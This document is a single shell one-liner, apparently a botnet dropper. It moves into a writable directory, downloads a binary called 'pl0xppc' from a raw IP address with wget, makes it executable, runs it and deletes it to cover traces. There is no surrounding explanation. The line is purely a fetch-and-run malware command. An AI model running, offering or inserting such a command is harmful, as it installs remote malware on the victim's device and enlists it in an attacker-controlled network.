cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.88.209.57/pl0xppc; chmod +x pl0xppc; ./pl0xppc; rm -rf pl0xppc
